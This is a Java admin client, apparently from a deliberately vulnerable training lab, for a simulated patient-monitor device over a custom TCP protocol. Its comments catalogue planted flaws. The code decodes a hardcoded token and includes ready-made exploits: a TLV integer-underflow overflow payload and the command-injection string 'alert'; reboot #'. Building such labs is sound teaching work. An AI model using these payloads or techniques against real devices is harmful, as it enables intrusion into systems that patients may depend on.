package com.vulnzoo.careotter_admin;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

/**
 * CareOtterClient — IGP v4 admin client (TCP :9999)
 *
 * VULNERABILIDADES DEL SERVICIO:
 * - Hardcoded token (cmd 0x02): "OtterMobile2026" obfuscado con XOR
 * - Information Disclosure (cmd 0x03): lee /etc/config/wireless con PSK
 * - Integer Underflow → BOF (cmd 0x04): TLV parser con remaining underflow
 * - Format String (cmd 0x05): snprintf(buf, size, module_name)
 * - Format String #2 (cmd 0x0B): snprintf en log de eventos
 * - Command Injection (cmd 0x0C): system("curl ... -d 'msg=<payload>'")
 *
 * PROTOCOLO IGP v4:
 * Header: [Magic(4) | Cmd(1) | Status(1) | Len(2)] = 8 bytes, Big Endian
 * Magic: 0x474F4154 ("GOAT")
 *
 * COMANDOS:
 * 0x01 - SYS_INFO:         Información del sistema (kernel, arch)
 * 0x02 - AUTHENTICATE:     Login con token XOR-obfuscado
 * 0x03 - GET_NETWORK:      Lee /etc/config/wireless (information disclosure)
 * 0x04 - SET_PREFS:        TLV preferences (integer underflow → BOF)
 * 0x05 - VERIFY_STATUS:    Diagnóstico de subsistema (format string)
 * 0x06 - SET_WIFI:         Configura WiFi vía UCI (requiere auth)
 * 0x07 - GET_VITALS:       Proxy TCP → sensor :8081
 * 0x08 - SET_THRESHOLD:    Umbrales BPM/SpO2 TLV limpio (requiere auth)
 * 0x09 - REBOOT_SERVICE:   Reinicia init.d service (requiere auth)
 * 0x0A - GET_LOG:          Últimos 512 bytes del log admin (requiere auth)
 * 0x0B - DEFIBRILLATE:     Desfibrilador simulado — format string en log
 * 0x0C - EMERGENCY_ALERT:  Alerta vía curl — command injection
 */
public class CareOtterClient {

    private static final int MAGIC = 0x474F4154;
    private static final int PORT  = 9999;

    // VULNERABILITY: XOR-obfuscated token — reverse with XOR 0x5A → "OtterMobile2026"
    private static final byte[] ENCODED_TOKEN = {
        0x15, 0x2E, 0x2E, 0x3F, 0x28, 0x17, 0x35, 0x38,
        0x33, 0x36, 0x3F, 0x68, 0x6A, 0x68, 0x6C
    };
    private static final byte XOR_KEY = 0x5A;

    private final String serverIp;
    private final int    serverPort;
    private boolean isAuthenticated = false;

    public CareOtterClient(String ip, int port) {
        this.serverIp   = ip;
        this.serverPort = port;
    }

    // ── Token ─────────────────────────────────────────────────────────────────

    private String getDecodedToken() {
        byte[] decoded = new byte[ENCODED_TOKEN.length];
        for (int i = 0; i < ENCODED_TOKEN.length; i++)
            decoded[i] = (byte) (ENCODED_TOKEN[i] ^ XOR_KEY);
        return new String(decoded);
    }

    // ── Header ────────────────────────────────────────────────────────────────

    private byte[] buildHeader(byte cmd, short payloadLen) {
        ByteBuffer buf = ByteBuffer.allocate(8).order(ByteOrder.BIG_ENDIAN);
        buf.putInt(MAGIC);
        buf.put(cmd);
        buf.put((byte) 0x00);
        buf.putShort(payloadLen);
        return buf.array();
    }

    // ── Commands 0x01 – 0x05 ─────────────────────────────────────────────────

    public String getSystemInfo() throws IOException {
        return sendCommand((byte) 0x01, null);
    }

    public String authenticate() throws IOException {
        String r = sendCommand((byte) 0x02, getDecodedToken().getBytes());
        if (r.contains("AUTH_SUCCESS")) isAuthenticated = true;
        return r;
    }

    public String getWifiConfig() throws IOException {
        return sendCommand((byte) 0x03, null);
    }

    public String setAppTheme(String themeName) throws IOException {
        byte[] tv = themeName.getBytes();
        ByteBuffer tlv = ByteBuffer.allocate(2 + tv.length);
        tlv.put((byte) 0xAA);
        tlv.put((byte) tv.length);
        tlv.put(tv);
        return sendCommand((byte) 0x04, tlv.array());
    }

    /** EXPLOIT: TLV integer underflow → stack BOF */
    public String exploitUnderflow() throws IOException {
        byte[] malicious = { (byte) 0xAA, (byte) 0xFF, 0x41, 0x41, 0x41, 0x41 };
        return sendCommand((byte) 0x04, malicious);
    }

    public String verifyStatus(String moduleName) throws IOException {
        return sendCommand((byte) 0x05, moduleName.getBytes());
    }

    // ── Commands 0x06 – 0x0A ─────────────────────────────────────────────────

    public String setWifi(String ssid, String psk) throws IOException {
        return sendCommand((byte) 0x06, (ssid + "|" + psk).getBytes());
    }

    public String getVitals() throws IOException {
        return sendCommand((byte) 0x07, null);
    }

    public String setThresholds(int bpmMin, int bpmMax, int spo2Min) throws IOException {
        ByteBuffer tlv = ByteBuffer.allocate(9).order(ByteOrder.BIG_ENDIAN);
        tlv.put((byte) 0xBB); tlv.put((byte) 4);
        tlv.putShort((short) bpmMin); tlv.putShort((short) bpmMax);
        tlv.put((byte) 0xCC); tlv.put((byte) 1);
        tlv.put((byte) spo2Min);
        return sendCommand((byte) 0x08, tlv.array());
    }

    public String rebootService(String serviceName) throws IOException {
        return sendCommand((byte) 0x09, serviceName.getBytes());
    }

    public String getLog() throws IOException {
        return sendCommand((byte) 0x0A, null);
    }

    // ── Commands 0x0B – 0x0C (new) ───────────────────────────────────────────

    /**
     * DEFIBRILLATE_CMD — simulates defibrillator discharge.
     * Server writes event to /tmp/careotter_events.log using payload as snprintf format.
     * VULNERABILITY: format string sink #2.
     */
    public String triggerDefibrillator() throws IOException {
        return sendCommand((byte) 0x0B, "DISCHARGE".getBytes());
    }

    /**
     * EMERGENCY_ALERT — sends alert via curl.
     * VULNERABILITY: payload interpolated in system() → OS command injection.
     * Payload "alert'; reboot #" triggers device reboot.
     */
    public String sendEmergencyAlert(String alertMessage) throws IOException {
        return sendCommand((byte) 0x0C, alertMessage.getBytes());
    }

    /** Pre-built command injection payload demonstrating the vuln. */
    public String exploitCommandInjection() throws IOException {
        return sendCommand((byte) 0x0C, "alert'; reboot #".getBytes());
    }

    // ── Transport ─────────────────────────────────────────────────────────────

    private String sendCommand(byte cmd, byte[] payload) throws IOException {
        short len    = (payload != null) ? (short) payload.length : 0;
        byte[] hdr   = buildHeader(cmd, len);

        try (Socket s   = new Socket(serverIp, serverPort);
             DataOutputStream out = new DataOutputStream(s.getOutputStream());
             DataInputStream  in  = new DataInputStream(s.getInputStream())) {

            out.write(hdr);
            if (payload != null) out.write(payload);
            out.flush();

            byte[] resp = new byte[4096];
            int n = in.read(resp);
            return (n > 0) ? new String(resp, 0, n) : "EMPTY_RESP";
        }
    }

    public boolean isAuthenticated() { return isAuthenticated; }
}
